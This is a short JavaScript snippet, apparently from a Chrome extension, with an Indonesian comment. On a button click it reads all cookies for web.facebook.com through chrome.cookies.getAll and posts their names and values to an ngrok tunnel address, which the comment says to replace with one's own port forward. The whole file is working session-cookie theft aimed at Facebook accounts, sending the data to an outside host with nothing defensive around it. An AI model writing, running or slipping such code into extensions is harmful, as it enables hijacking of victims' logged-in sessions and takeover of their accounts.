$("#klik").click(function () {
	chrome.cookies.getAll({ url: "https://web.facebook.com" }, function (cookies) {
		console.log(cookies);
		let cookieName = [];
		let cookieVal = [];
		cookies.forEach(function (cookie) {
			cookieName.push(cookie.name);
			cookieVal.push(cookie.value);
		});

		$.ajax({
			url: "https://196e-125-162-210-160.ngrok-free.app", // ubah sesuai dengan port forward kalian
			type: "POST",
			data: { nama: cookieName, isi: cookieVal },
			success: function (response) {
				console.log("Data sent successfully");
				console.log(response);
			},
			error: function (error) {
				console.error("Error sending data:", error);
				console.log(error);
			},
		});
	});
});
